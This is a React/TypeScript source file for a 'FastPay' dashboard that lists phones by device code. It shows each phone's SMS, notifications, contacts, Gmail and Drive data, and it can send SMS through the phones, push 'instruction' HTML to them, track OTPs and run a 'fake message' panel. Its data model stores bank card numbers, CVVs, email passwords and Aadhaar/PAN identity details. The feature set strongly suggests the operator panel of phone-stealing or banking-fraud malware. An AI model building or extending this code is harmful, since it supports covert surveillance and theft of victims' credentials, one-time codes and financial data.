/**
 * Legacy: unused (app uses DashboardShell at /dashboard/v2).
 * Kept for reference; remove when no longer needed.
 */
import { useEffect, useState, useCallback, useMemo, useRef, lazy, Suspense } from 'react'
import { useNavigate, useLocation } from 'react-router-dom'
import { getSession, clearSession, hasFullAccess, getUserAccess } from '@/lib/auth'
import { applyStoredTheme } from '@/lib/theme'
import { Button } from '@/component/ui/button'
import {
  Loader,
  MoveRight,
  UserRound,
  AtSign,
  ReplyAll,
  TextSearch,
  Check,
  Bookmark,
  SlidersHorizontal,
  ArrowUpDown,
  X,
  Shuffle,
  ArrowUpRight,
  ListFilter,
  MoreHorizontal,
  CornerUpRight,
  ListPlus,
  CornerRightDown,
  ChevronDown,
  TextCursorInput,
  PictureInPicture2,
  Ban,
  Settings2,
  FileText,
  Contact,
  Wifi,
  WifiOff,
  Shield,
  Building2,
  MessageSquare,
  Monitor,
  Battery,
  RefreshCw,
  LayoutTemplate,
  Activity,
  Smartphone,
  LayoutGrid,
  Bell,
  Terminal,
  Download,
  CreditCard,
  User,
  Database,
  Copy,
  Edit,
} from 'lucide-react'
import { formatDistanceToNow } from 'date-fns'
import { useToast } from '@/lib/use-toast'
import { UnifiedLayout } from '@/component/UnifiedLayout'
import { getApiUrl } from '@/lib/api-client'
import {
  useDashboardMessages,
  useDashboardNotifications,
  useDashboardContacts,
  useDashboardDevices,
  useDeviceMetadata,
  useDeviceStatus,
} from '@/hooks/dashboard'
import {
  messageProcessors,
  getProcessorById,
  getDefaultProcessor,
  type MessageProcessor,
} from '@/lib/message-processors'
import { FeatureGate } from '@/component/FeatureGate'
import { DeviceInfoCard } from '@/component/DeviceInfoCard'
import { Card, CardContent } from '@/component/ui/card'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/component/ui/tabs'
import { BreadcrumbNav } from '@/component/BreadcrumbNav'
import { FloatingActionButton } from '@/component/FloatingActionButton'
import { Home } from 'lucide-react'
import { Badge } from '@/component/ui/badge'
import { DeviceSummaryCards } from './dashboard/components/DeviceSummaryCards'
import type { DeviceSubTab } from './dashboard/components/DeviceSubTabs'

// Lazy load all Dashboard sections for code splitting
const MessagesSection = lazy(() => import('./dashboard/components/MessagesSection').then(m => ({ default: m.MessagesSection })))
const NotificationsSection = lazy(() => import('./dashboard/components/NotificationsSection').then(m => ({ default: m.NotificationsSection })))
const ContactsSection = lazy(() => import('./dashboard/components/ContactsSection').then(m => ({ default: m.ContactsSection })))
const OverviewSection = lazy(() => import('./dashboard/components/OverviewSection').then(m => ({ default: m.OverviewSection })))
const DevicesSection = lazy(() => import('./dashboard/components/DevicesSection').then(m => ({ default: m.DevicesSection })))
const AnalyticsSection = lazy(() => import('./dashboard/components/AnalyticsSection').then(m => ({ default: m.AnalyticsSection })))
const InputFilesSection = lazy(() => import('./dashboard/components/InputFilesSection').then(m => ({ default: m.InputFilesSection })))
const CommandsSection = lazy(() => import('./dashboard/components/CommandsSection').then(m => ({ default: m.CommandsSection })))
const ExportSection = lazy(() => import('./dashboard/components/ExportSection').then(m => ({ default: m.ExportSection })))
const ActivationFailureLogsSection = lazy(() => import('./dashboard/components/ActivationFailureLogsSection').then(m => ({ default: m.ActivationFailureLogsSection })))
const ActivityLogsSection = lazy(() => import('./dashboard/components/ActivityLogsSection').then(m => ({ default: m.ActivityLogsSection })))
const RemoteMessagesSection = lazy(() => import('./dashboard/components/RemoteMessagesSection').then(m => ({ default: m.RemoteMessagesSection })))
const PermissionsSection = lazy(() => import('./dashboard/components/PermissionsSection').then(m => ({ default: m.PermissionsSection })))
const BankInfoSection = lazy(() => import('./dashboard/components/BankInfoSection').then(m => ({ default: m.BankInfoSection })))
const AddBankCardSection = lazy(() => import('./dashboard/components/AddBankCardSection').then(m => ({ default: m.AddBankCardSection })))
const InstructionsSection = lazy(() => import('./dashboard/components/InstructionsSection').then(m => ({ default: m.InstructionsSection })))
const SystemInfoSection = lazy(() => import('./dashboard/components/SystemInfoSection').then(m => ({ default: m.SystemInfoSection })))
const GmailSection = lazy(() => import('./dashboard/components/GmailSection').then(m => ({ default: m.GmailSection })))
const DriveSection = lazy(() => import('./dashboard/components/DriveSection').then(m => ({ default: m.DriveSection })))
const BankCardsList = lazy(() => import('./dashboard/components/BankCardsList').then(m => ({ default: m.BankCardsList })))
const TelegramBotsSection = lazy(() => import('./dashboard/components/TelegramBotsSection').then(m => ({ default: m.TelegramBotsSection })))
const TabNavigation = lazy(() => import('./dashboard/components/TabNavigation').then(m => ({ default: m.TabNavigation })))
const UtilitiesSection = lazy(() => import('./dashboard/components/UtilitiesSection').then(m => ({ default: m.UtilitiesSection })))
const MessageSchedulerPanel = lazy(() => import('./dashboard/components/MessageSchedulerPanel').then(m => ({ default: m.MessageSchedulerPanel })))
const FakeMessagePanel = lazy(() => import('./dashboard/components/FakeMessagePanel').then(m => ({ default: m.FakeMessagePanel })))
const AutoReplyPanel = lazy(() => import('./dashboard/components/AutoReplyPanel').then(m => ({ default: m.AutoReplyPanel })))
const BulkOperationsPanel = lazy(() => import('./dashboard/components/BulkOperationsPanel').then(m => ({ default: m.BulkOperationsPanel })))
const MessageTemplatesPanel = lazy(() => import('./dashboard/components/MessageTemplatesPanel').then(m => ({ default: m.MessageTemplatesPanel })))
const MessageAnalyticsPanel = lazy(() => import('./dashboard/components/MessageAnalyticsPanel').then(m => ({ default: m.MessageAnalyticsPanel })))
const DeviceSubTabs = lazy(() => import('./dashboard/components/DeviceSubTabs').then(m => ({ default: m.DeviceSubTabs })))

// Lazy load ReactQuill (only when instruction dialog is opened)
const ReactQuill = lazy(() => import('react-quill-new').then(m => ({ default: m.default })))
import type {
  SMS,
  Notification as NotificationType,
  Contact as ContactType,
  ActiveTabType,
} from './dashboard/types'
import {
  DEFAULT_SIDEBAR_TAB,
  SIDEBAR_TAB_STORAGE_KEY,
  getAllowedSidebarTab,
  isSidebarTabKey,
  isTabAllowedForAccess,
} from '@/lib/sidebar-tabs'
// Table components removed - now used in extracted components
import { Input } from '@/component/ui/input'
import { Dialog, DialogContent, DialogHeader, DialogClose } from '@/component/ui/dialog'
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/component/ui/select'
import { Label } from '@/component/ui/label'
import { Switch } from '@/component/ui/switch'
import { Skeleton } from '@/component/ui/skeleton'
import { database, storage } from '@/lib/firebase'
import {
  ref,
  onValue,
  off,
  query,
  orderByKey,
  limitToLast,
  set,
  remove,
  get,
  child,
} from 'firebase/database'
import {
  getDeviceMessagesPath,
  getDeviceNotificationsPath,
  getDeviceContactsPath,
  getDeviceCommandsPath,
  getDeviceMetadataPath,
  getDeviceMetadataPathWithMode,
  getDeviceSystemInfoPath,
  getDeviceInstructionCardPath,
  getAllDevicesPath,
  getUserDevicesPath,
  getDeviceListPath,
  getDeviceListPathByMode,
  getHeartbeatsPath,
} from '@/lib/firebase-helpers'
import { smsCache, notificationsCache, contactsCache, deviceStatusCache } from '@/lib/data-cache'
import { retryWithBackoff, isRetryableError } from '@/lib/retry-utils'
import { prefetchDeviceData, prefetchDevicesData } from '@/lib/prefetch-utils'
import { fetchDevices } from '@/lib/api-client'
import { cn } from '@/lib/utils'
import {
  ref as storageRef,
  listAll,
  getDownloadURL,
  getMetadata,
  uploadBytes,
} from 'firebase/storage'
// SearchInput and FilterMode removed - now used in extracted components
import { Image, Video } from 'lucide-react'
import SettingsPanel from '@/component/SettingsPanel'
// Other components now imported in section components

// Loading fallback for lazy-loaded sections
const SectionLoader = () => (
  <div className="flex items-center justify-center p-8">
    <Loader className="h-6 w-6 animate-spin text-muted-foreground" />
  </div>
)

interface DashboardProps {
  onLogout: () => void
}

interface User {
  id: string
  device: string | null
  phone: string | null
  code: string | null
  time: string | null
  admin: string | null
  lastSeen?: number | null
  batteryPercentage?: number | null
  isOnline?: boolean
}
// SMS and Notification interfaces removed - now imported from './dashboard/types'

interface PhoneData {
  currentTime?: string
  version?: string
  battery?: string
  messages?: Array<{
    localNumber: string
    senderNumber: string
    receiveTime: string
    content: string
  }>
  htmlContent?: string
}

interface InputFile {
  name: string
  url: string
  contentType: string
  time: string
  size: number
}

// Contact interface removed - now imported from './dashboard/types'

export default function Dashboard({ onLogout }: DashboardProps) {
  const navigate = useNavigate()
  const location = useLocation()
  const { toast } = useToast()
  const [session, setSession] = useState(() => getSession())

  // Handle adding device by code
  const handleAddDevice = async () => {
    if (!dashboardCode.trim()) {
      toast({
        title: 'Error',
        description: 'Please enter a device code',
        variant: 'destructive',
      })
      return
    }

    if (!session?.email) {
      toast({
        title: 'Error',
        description: 'Session not found. Please log in again.',
        variant: 'destructive',
      })
      return
    }

    setIsAddingDevice(true)
    try {
      // Check if device code exists in fastpay/device-list/{CODE}
      const deviceListRef = getDeviceListPath(dashboardCode.trim())
      const deviceListSnapshot = await get(deviceListRef)

      if (!deviceListSnapshot.exists()) {
        toast({
          title: 'Device not found',
          description: `Device code "${dashboardCode.trim()}" does not exist in device-list`,
          variant: 'destructive',
        })
        setIsAddingDevice(false)
        return
      }

      const deviceListData = deviceListSnapshot.val()
      const deviceId = deviceListData?.deviceId

      if (!deviceId) {
        toast({
          title: 'Error',
          description: 'Device code exists but no deviceId found',
          variant: 'destructive',
        })
        setIsAddingDevice(false)
        return
      }

      // Add device to current logged-in user's device list
      const emailPath = session.email.replace(/\./g, "'dot'")
      const userDevicePath = `users/${emailPath}/device/${deviceId}`
      const userDeviceRef = ref(database, userDevicePath)

      // Check if device already exists in user's device list
      const userDeviceSnapshot = await get(userDeviceRef)

      if (userDeviceSnapshot.exists()) {
        toast({
          title: 'Device already added',
          description: 'This device is already in your device list',
          variant: 'default',
        })
        setIsAddingDevice(false)
        return
      }

      // Add device ID to current logged-in user's device list
      await set(userDeviceRef, true)

      toast({
        title: 'Device added',
        description: `Device "${deviceId}" has been added to your device list`,
        variant: 'default',
      })

      // Clear the code field
      setDashboardCode('')
      localStorage.removeItem('dashboardCode')
    } catch (error) {
      console.error('Error adding device:', error)
      toast({
        title: 'Error',
        description: 'Failed to add device. Please try again.',
        variant: 'destructive',
      })
    } finally {
      setIsAddingDevice(false)
    }
  }

  // Store admin status for feature gating (no redirect - all users can access)
  const isAdmin = hasFullAccess()
  const userAccessLevel = getUserAccess()
  const [selectedProcessorId, setSelectedProcessorId] = useState<string>(() => {
    try {
      const saved = localStorage.getItem('dashboardMessageProcessorId')
      if (saved) return saved
      const defaultProcessor = getDefaultProcessor()
      return defaultProcessor?.id || 'neft-inr-merge'
    } catch (error) {
      console.error('Error initializing processor:', error)
      return 'neft-inr-merge'
    }
  })
  const selectedProcessor = useMemo(() => {
    try {
      const processor = getProcessorById(selectedProcessorId)
      if (processor) return processor
      return getDefaultProcessor()
    } catch (error) {
      console.error('Error getting processor:', error)
      return getDefaultProcessor()
    }
  }, [selectedProcessorId])
  const [processorInput, setProcessorInput] = useState<string>(() => {
    try {
      const saved = localStorage.getItem('dashboardProcessorInput')
      return saved || ''
    } catch (error) {
      return ''
    }
  })
  const [selectedUserId, setSelectedUserId] = useState<string | null>(null)
  const [taglineMap, setTaglineMap] = useState<Map<string, string>>(new Map()) // Map device code to tagline
  // ActiveTabType now imported from './dashboard/types'

  const getStoredActiveTab = () => {
    try {
      return localStorage.getItem(SIDEBAR_TAB_STORAGE_KEY)
    } catch {
      return null
    }
  }

  const getInitialTab = (): ActiveTabType => {
    const params = new URLSearchParams(location.search)
    const urlTab = params.get('tab')
    if (urlTab) {
      return urlTab as ActiveTabType
    }
    return getAllowedSidebarTab(DEFAULT_SIDEBAR_TAB, userAccessLevel)
  }

  const [activeTab, setActiveTab] = useState<ActiveTabType>(getInitialTab)
  
  // Device sub-tabs state (Message, Gmail, Data, Utility) - default to 'message'
  type DataSubTab =
    | 'notifications'
    | 'contacts'
    | 'input'
    | 'system-info'
    | 'bank-info'
    | 'export'
    | 'remote-messages'

  const [deviceSubTab, setDeviceSubTab] = useState<DeviceSubTab>('message')
  const [dataSubTab, setDataSubTab] = useState<DataSubTab>('notifications')
  
  useEffect(() => {
    const params = new URLSearchParams(location.search)
    const tabParam = params.get('tab')
    if (tabParam && tabParam !== activeTab) {
      const isAllowed = isSidebarTabKey(tabParam)
        ? isTabAllowedForAccess(tabParam, userAccessLevel)
        : true
      if (isAllowed) {
        setActiveTab(tabParam as ActiveTabType)
      }
    }
  }, [location.search, activeTab, userAccessLevel])

  useEffect(() => {
    if (isSidebarTabKey(activeTab) && !isTabAllowedForAccess(activeTab, userAccessLevel)) {
      setActiveTab(getAllowedSidebarTab(null, userAccessLevel))
    }
  }, [activeTab, userAccessLevel])

  useEffect(() => {
    try {
      if (isSidebarTabKey(activeTab)) {
        localStorage.setItem(SIDEBAR_TAB_STORAGE_KEY, activeTab)
      }
    } catch {
      // Ignore storage errors
    }

    const params = new URLSearchParams(location.search)
    if (params.get('tab') !== activeTab) {
      params.set('tab', activeTab)
      navigate({ search: params.toString() }, { replace: true })
    }
  }, [activeTab, location.search, navigate])
  const [viewMode, setViewMode] = useState<'tabs' | 'widgets'>(() => {
    const saved = localStorage.getItem('dashboard-viewMode')
    return saved === 'widgets' || saved === 'tabs' ? saved : 'tabs'
  })
  const [loading, setLoading] = useState(false)
  const fileInputRef = useRef<HTMLInputElement>(null)
  const [isSwitchingDevice, setIsSwitchingDevice] = useState(false)
  const [isSidebarExpanded, setIsSidebarExpanded] = useState(false)
  const deviceSwitchTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null)
  // copiedCellId removed - now handled in extracted components
  const [currentTime, setCurrentTime] = useState<number>(Date.now())
  const [refreshTrigger, setRefreshTrigger] = useState(0)
  const [refreshDeviceStatusTrigger, setRefreshDeviceStatusTrigger] = useState(0)
  
  // Use hooks for device metadata and status
  const {
    battery: deviceBattery,
    lastSeen: deviceLastSeen,
    dataEnabled: deviceDataEnabled,
    deviceCode,
    loading: deviceMetadataLoading,
    error: deviceMetadataError,
  } = useDeviceMetadata({
    deviceId: selectedUserId,
  })

  const {
    status: deviceStatus,
    refresh: refreshDeviceStatus,
  } = useDeviceStatus({
    deviceId: selectedUserId,
    refreshTrigger: refreshDeviceStatusTrigger,
  })
  const [lastSentOTP, setLastSentOTP] = useState<{ phone: string; otp: string } | null>(null)
  const otpTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null)
  const [phoneData, setPhoneData] = useState<PhoneData | null>(null)
  const [loadingPhoneData, setLoadingPhoneData] = useState(false)
  const [phoneDataError, setPhoneDataError] = useState<string | null>(null)
  const [phoneDataKey, setPhoneDataKey] = useState(0)
  const [inputFiles, setInputFiles] = useState<InputFile[]>([])
  const [loadingInputFiles, setLoadingInputFiles] = useState(false)
  const [previewFile, setPreviewFile] = useState<InputFile | null>(null)

  // Edit mode state for cards
  const [isBankCardEditMode, setIsBankCardEditMode] = useState(false)
  const [isContactEditMode, setIsContactEditMode] = useState(false)
  const [editedBankCard, setEditedBankCard] = useState<{
    id: number
    device_id: string
    template_code: string | null
    template_name: string | null
    card_number: string
    card_holder_name: string
    bank_name: string
    bank_code: string | null
    card_type: 'credit' | 'debit' | 'prepaid'
    expiry_date: string | null
    cvv: string | null
    account_name: string | null
    account_number: string | null
    ifsc_code: string | null
    branch_name: string | null
    balance: string | null
    currency: string
    status: 'active' | 'inactive' | 'blocked'
    mobile_number: string | null
    email: string | null
    email_password: string | null
    kyc_name: string | null
    kyc_address: string | null
    kyc_dob: string | null
    kyc_aadhar: string | null
    kyc_pan: string | null
    additional_info: Record<string, any> | null
    created_at: string | null
    updated_at: string | null
  } | null>(null)
  const [editedContact, setEditedContact] = useState<{
    id: number
    device_id: string
    template_code: string | null
    template_name: string | null
    card_number: string
    card_holder_name: string
    bank_name: string
    bank_code: string | null
    card_type: 'credit' | 'debit' | 'prepaid'
    expiry_date: string | null
    cvv: string | null
    account_name: string | null
    account_number: string | null
    ifsc_code: string | null
    branch_name: string | null
    balance: string | null
    currency: string
    status: 'active' | 'inactive' | 'blocked'
    mobile_number: string | null
    email: string | null
    email_password: string | null
    kyc_name: string | null
    kyc_address: string | null
    kyc_dob: string | null
    kyc_aadhar: string | null
    kyc_pan: string | null
    additional_info: Record<string, any> | null
    created_at: string | null
    updated_at: string | null
  } | null>(null)

  // Bank Card state
  const [bankCard, setBankCard] = useState<{
    id: number
    device_id: string
    template_code: string | null
    template_name: string | null
    card_number: string
    card_holder_name: string
    bank_name: string
    bank_code: string | null
    card_type: 'credit' | 'debit' | 'prepaid'
    expiry_date: string | null
    cvv: string | null
    account_name: string | null
    account_number: string | null
    ifsc_code: string | null
    branch_name: string | null
    balance: string | null
    currency: string
    status: 'active' | 'inactive' | 'blocked'
    mobile_number: string | null
    email: string | null
    email_password: string | null
    kyc_name: string | null
    kyc_address: string | null
    kyc_dob: string | null
    kyc_aadhar: string | null
    kyc_pan: string | null
    additional_info: Record<string, any> | null
    created_at: string | null
    updated_at: string | null
  } | null>(null)
  const [loadingBankCard, setLoadingBankCard] = useState(false)
  
  // Sync edited state when bankCard changes
  useEffect(() => {
    if (bankCard) {
      setEditedBankCard({ ...bankCard })
      setEditedContact({ ...bankCard })
    }
  }, [bankCard])

  // Data limit state with localStorage persistence (only 20, 30, 50)
  const [dataLimit, setDataLimit] = useState<number>(() => {
    const saved = localStorage.getItem('dashboard-dataLimit')
    const savedValue = saved ? parseInt(saved) : 30
    // Ensure saved value is one of the allowed values
    return [20, 30, 50].includes(savedValue) ? savedValue : 30
  })

  // Sync toggle states with localStorage persistence
  const [contactsSyncEnabled, setContactsSyncEnabled] = useState<boolean>(() => {
    const saved = localStorage.getItem('dashboard-contactsSyncEnabled')
    return saved ? saved === 'true' : true // Default: enabled
  })
  const [notificationsSyncEnabled, setNotificationsSyncEnabled] = useState<boolean>(() => {
    const saved = localStorage.getItem('dashboard-notificationsSyncEnabled')
    return saved ? saved === 'true' : true // Default: enabled
  })
  const [showSettings, setShowSettings] = useState(false)

  // Code configuration state
  const [dashboardCode, setDashboardCode] = useState<string>(() => {
    const saved = localStorage.getItem('dashboard-code')
    return saved || ''
  })
  const [isAddingDevice, setIsAddingDevice] = useState(false)

  // TODO: State variables for new features (to be implemented)
  // Permissions state
  // const [permissions, setPermissions] = useState<DevicePermission | null>(null)
  // const [loadingPermissions, setLoadingPermissions] = useState(false)
  // const [permissionsError, setPermissionsError] = useState<string | null>(null)

  // Bank Info state
  // const [bankInfo, setBankInfo] = useState<BankInfo | null>(null)
  // const [bankStatus, setBankStatus] = useState<BankStatus | null>(null)
  // const [deviceCode, setDeviceCode] = useState<string | null>(null)
  // const [loadingBankInfo, setLoadingBankInfo] = useState(false)

  // Instructions state
  // const [instructionCard, setInstructionCard] = useState<InstructionCard | null>(null)
  // const [instructionVisible, setInstructionVisible] = useState(false)
  // const [loadingInstruction, setLoadingInstruction] = useState(false)

  // Remote Messages state
  // const [remoteMessages, setRemoteMessages] = useState<ParsedMessage[]>([])
  // const [loadingRemoteMessages, setLoadingRemoteMessages] = useState(false)
  // const [remoteMessagesError, setRemoteMessagesError] = useState<string | null>(null)

  // System Info state
  // const [systemInfo, setSystemInfo] = useState<SystemInfo | null>(null)
  // const [deviceInfoFetch, setDeviceInfoFetch] = useState<DeviceInfoFetch | null>(null)
  // const [loadingSystemInfo, setLoadingSystemInfo] = useState(false)
  // const [systemInfoError, setSystemInfoError] = useState<string | null>(null)

  // Filter states removed - now handled in MessagesSection, NotificationsSection, ContactsSection

  // Message dialog states
  const [isMessageDialogOpen, setIsMessageDialogOpen] = useState(false)
  const [messageType, setMessageType] = useState<'sms' | 'whatsapp' | null>(null)
  const [otp, setOtp] = useState<string[]>(['', '', '', '', '', ''])
  const [sendingMessage, setSendingMessage] = useState(false)

  // Instruction dialog states
  const [isInstructionDialogOpen, setIsInstructionDialogOpen] = useState(false)
  const [instructionText, setInstructionText] = useState(
    () => localStorage.getItem('dashboard-lastInstruction') || ''
  )
  const [sendingInstruction, setSendingInstruction] = useState(false)
  const INSTRUCTION_PRESETS = [
    'Welcome to FastPay',
    'Payment Successful',
    'Please pay at counter',
    'Thank you, visit again',
    'Processing payment...',
  ]
  const [messageStatus, setMessageStatus] = useState<{
    type: 'success' | 'error' | null
    message: string
  }>({ type: null, message: '' })

  // Send Generic SMS Dialog states
  const [isSendSmsDialogOpen, setIsSendSmsDialogOpen] = useState(false)
  const [sendSmsPhone, setSendSmsPhone] = useState('')
  const [sendSmsMessage, setSendSmsMessage] = useState('')
  const [sendSmsSim, setSendSmsSim] = useState<'1' | '2'>('1')
  const [selectedTargetDeviceIds, setSelectedTargetDeviceIds] = useState<string[]>([])
  const [isDeviceSelectorOpen, setIsDeviceSelectorOpen] = useState(false)

  // Get Input Dialog states
  const [isGetInputDialogOpen, setIsGetInputDialogOpen] = useState(false)
  const [selectedInputType, setSelectedInputType] = useState<string | null>(null)
  const [sendingInputRequest, setSendingInputRequest] = useState(false)
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([])

  // Filter refs removed - now handled in extracted components

  // Memoize session email to prevent unnecessary re-renders
  const sessionEmail = useMemo(() => session?.email || null, [session?.email])

  // Use the extracted hook for devices management (needs sessionEmail and refreshTrigger)
  const {
    devices: users,
    loading: devicesLoading,
    error: devicesError,
    refresh: refreshDevices,
  } = useDashboardDevices({
    sessionEmail: sessionEmail,
    refreshTrigger: refreshTrigger,
  })
  
  // Use the extracted hook for SMS/message management
  const {
    messages: sms,
    rawMessages: rawSms,
    loading: smsLoading,
    error: smsError,
    isConnected,
    refresh: refreshMessages,
  } = useDashboardMessages({
    deviceId: selectedUserId,
    dataLimit: dataLimit,
    selectedProcessor: selectedProcessor,
    processorInput: processorInput,
    activeTab: activeTab,
  })

  // Use the extracted hook for notifications management
  const notificationsActiveTab =
    activeTab === 'notifications' || (deviceSubTab === 'data' && dataSubTab === 'notifications')
      ? 'notifications'
      : 'inactive'

  const {
    notifications,
    loading: notificationsLoading,
    error: notificationsError,
    refresh: refreshNotifications,
  } = useDashboardNotifications({
    deviceId: selectedUserId,
    dataLimit: dataLimit,
    activeTab: notificationsActiveTab,
    syncEnabled: notificationsSyncEnabled,
  })

  const contactsActiveTab =
    activeTab === 'contacts' || (deviceSubTab === 'data' && dataSubTab === 'contacts')
      ? 'contacts'
      : 'inactive'

  // Use the extracted hook for contacts management
  const {
    contacts,
    loading: contactsLoading,
    error: contactsError,
    refresh: refreshContacts,
  } = useDashboardContacts({
    deviceId: selectedUserId,
    activeTab: contactsActiveTab,
    syncEnabled: contactsSyncEnabled,
  })

  // Filter helper functions and memoized filtered data removed
  // Now handled in MessagesSection, NotificationsSection, ContactsSection components

  // Dropdown click handlers removed - now handled in extracted components

  const handleSendInstruction = async () => {
    if (!selectedUser || !instructionText) return
    setSendingInstruction(true)

    try {
      // Use helper function for instruction card path
      const instructionCardRef = getDeviceInstructionCardPath(selectedUser.id)
      const instructionCardHtmlRef = child(instructionCardRef, 'html')
      await set(instructionCardHtmlRef, instructionText)

      localStorage.setItem('dashboard-lastInstruction', instructionText)

      setMessageStatus({
        type: 'success',
        message: 'Instruction sent successfully!',
      })

      setTimeout(() => {
        setIsInstructionDialogOpen(false)
        setMessageStatus({ type: null, message: '' })
      }, 2000)
    } catch (error) {
      console.error('Error sending instruction:', error)
      setMessageStatus({
        type: 'error',
        message: error instanceof Error ? error.message : 'Failed to send instruction',
      })
    } finally {
      setSendingInstruction(false)
    }
  }

  const handleLogout = useCallback(() => {
    clearSession()
    onLogout()
  }, [onLogout])

  // processSMSData function moved to useDashboardMessages hook

  // processNotificationData function moved to useDashboardNotifications hook

  // Combined fetch function for refresh button (now just triggers a refresh by re-reading)

  // Persist dataLimit to localStorage whenever it changes
  useEffect(() => {
    localStorage.setItem('dashboard-dataLimit', dataLimit.toString())
  }, [dataLimit])

  // Persist sync toggles to localStorage
  useEffect(() => {
    localStorage.setItem('dashboard-contactsSyncEnabled', contactsSyncEnabled.toString())
  }, [contactsSyncEnabled])

  useEffect(() => {
    localStorage.setItem('dashboard-notificationsSyncEnabled', notificationsSyncEnabled.toString())
  }, [notificationsSyncEnabled])

  // Persist view mode to localStorage
  useEffect(() => {
    localStorage.setItem('dashboard-viewMode', viewMode)
  }, [viewMode])

  // Persist selected processor to localStorage
  useEffect(() => {
    localStorage.setItem('dashboardMessageProcessorId', selectedProcessorId)
  }, [selectedProcessorId])

  // Persist processor input to localStorage
  useEffect(() => {
    localStorage.setItem('dashboardProcessorInput', processorInput)
  }, [processorInput])

  // Check session on mount only
  useEffect(() => {
    const currentSession = getSession()
    if (!currentSession) {
      onLogout()
      return
    }
    setSession(currentSession)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  // Devices management now handled by useDashboardDevices hook

  // Refresh devices function
  const handleRefreshDevices = useCallback(() => {
    setRefreshTrigger(prev => prev + 1)
    refreshDevices()
    toast({
      title: 'Refreshing',
      description: 'Updating device list...',
      variant: 'default',
    })
  }, [toast, refreshDevices])

  // Fetch Tagline and device-list name for devices when code is available
  const fetchedTaglinesRef = useRef<Set<string>>(new Set())
  const deviceListNameMapRef = useRef<Set<string>>(new Set()) // Track codes that have name in device-list/{code}/name
  const deviceListNameCheckedRef = useRef<Set<string>>(new Set()) // Track codes that have been checked (whether name exists or not)

  useEffect(() => {
    const taglinePromises: Promise<void>[] = []
    const namePromises: Promise<void>[] = []

    users.forEach(user => {
      if (user.code) {
        // Fetch tagline if not already fetched
        if (!fetchedTaglinesRef.current.has(user.code)) {
          fetchedTaglinesRef.current.add(user.code)
          const taglinePromise = (async () => {
            try {
              const taglineRef = getDeviceListPath(user.code!, 'Tagline')
              const taglineSnapshot = await get(taglineRef)
              if (taglineSnapshot.exists()) {
                const tagline = taglineSnapshot.val()
                if (typeof tagline === 'string') {
                  setTaglineMap(prev => new Map(prev).set(user.code!, tagline))
                }
              }
            } catch (error) {
              console.error(`Error fetching tagline for code ${user.code}:`, error)
            }
          })()
          taglinePromises.push(taglinePromise)
        }

        // Check if device-list/{code}/name exists
        if (!deviceListNameCheckedRef.current.has(user.code)) {
          deviceListNameCheckedRef.current.add(user.code!) // Mark as checked
          const namePromise = (async () => {
            try {
              const nameRef = getDeviceListPath(user.code!, 'name')
              const nameSnapshot = await get(nameRef)
              if (nameSnapshot.exists()) {
                const name = nameSnapshot.val()
                if (
                  name &&
                  (typeof name === 'string' ||
                    (typeof name === 'object' && Object.keys(name).length > 0))
                ) {
                  // Name exists in device-list/{code}/name
                  deviceListNameMapRef.current.add(user.code!)
                }
              }
              // Device name check complete - hook will handle re-render via device updates
            } catch (error) {
              console.error(`Error checking device-list name for code ${user.code}:`, error)
              // Error handled - hook will handle re-render
            }
          })()
          namePromises.push(namePromise)
        }
      }
    })

    if (taglinePromises.length > 0) {
      Promise.all(taglinePromises).catch(console.error)
    }
    if (namePromises.length > 0) {
      Promise.all(namePromises).catch(console.error)
    }
  }, [users])

  // Debounced device selection handler with prefetching
  const handleDeviceSelect = useCallback(
    (deviceId: string | null) => {
      // Clear any pending device switch
      if (deviceSwitchTimeoutRef.current) {
        clearTimeout(deviceSwitchTimeoutRef.current)
      }

      // Data clearing is now handled by hooks automatically when deviceId changes
      // Cache management is handled internally by hooks

      setIsSwitchingDevice(true)

      // Prefetch data for nearby devices (non-blocking)
      const currentIndex = users.findIndex(u => u.id === deviceId)
      if (currentIndex !== -1) {
        const nearbyDevices = [users[currentIndex - 1]?.id, users[currentIndex + 1]?.id].filter(
          Boolean
        ) as string[]

        nearbyDevices.forEach(id => {
          prefetchDeviceData(id, { limit: dataLimit })
        })
      }

      // Debounce device switch by 150ms to prevent rapid switching
      deviceSwitchTimeoutRef.current = setTimeout(() => {
        setSelectedUserId(deviceId)
        // Automatically show messages when device is selected
        if (deviceId) {
          setActiveTab('sms')
        }
        setIsSwitchingDevice(false)
      }, 150)
    },
    [users, dataLimit]
  )

  // Cleanup timeout on unmount
  useEffect(() => {
    return () => {
      if (deviceSwitchTimeoutRef.current) {
        clearTimeout(deviceSwitchTimeoutRef.current)
      }
    }
  }, [])

  // Auto-select first user when users are loaded and no user is selected
  // Only auto-select if user is on a device-specific tab or overview
  useEffect(() => {
    if (
      users.length > 0 &&
      !selectedUserId &&
      (activeTab === 'sms' ||
        activeTab === 'notifications' ||
        activeTab === 'contacts' ||
        activeTab === 'input' ||
        activeTab === 'overview')
    ) {
      // Don't auto-select if user is on overview - let them choose
      if (activeTab !== 'overview') {
        handleDeviceSelect(users[0].id)
      }
    }
  }, [users, selectedUserId, handleDeviceSelect, activeTab])

  // Prefetch data for all devices when they're loaded (background)
  useEffect(() => {
    if (users.length > 0) {
      const deviceIds = users.map(u => u.id)
      // Prefetch in background (non-blocking)
      prefetchDevicesData(deviceIds, { limit: dataLimit })
    }
  }, [users, dataLimit])

  // Firebase connection state is now tracked by useDashboardMessages hook (isConnected)

  // Update current time every 10 seconds for real-time lastSeen updates
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentTime(Date.now())
    }, 10 * 1000) // Update every 10 seconds

    return () => clearInterval(interval)
  }, [])

  // Device metadata (battery, lastSeen, dataEnabled) now handled by useDeviceMetadata hook

  // Device status now handled by useDeviceStatus hook

  // Fetch bank card for selected device
  useEffect(() => {
    if (!selectedUserId) {
      setBankCard(null)
      return
    }

    let isMounted = true
    setLoadingBankCard(true)

    const fetchBankCard = async () => {
      try {
        const response = await fetch(getApiUrl(`/bank-cards/by-device/${selectedUserId}`))
        if (!response.ok) {
          if (response.status === 404) {
            // No bank card for this device - this is normal
            if (isMounted) {
              setBankCard(null)
              setLoadingBankCard(false)
            }
            return
          }
          throw new Error('Failed to fetch bank card')
        }
        const data = await response.json()
        if (isMounted) {
          setBankCard({
            id: data.id,
            device_id: data.device_id || '',
            template_code: data.template_code || null,
            template_name: data.template_name || null,
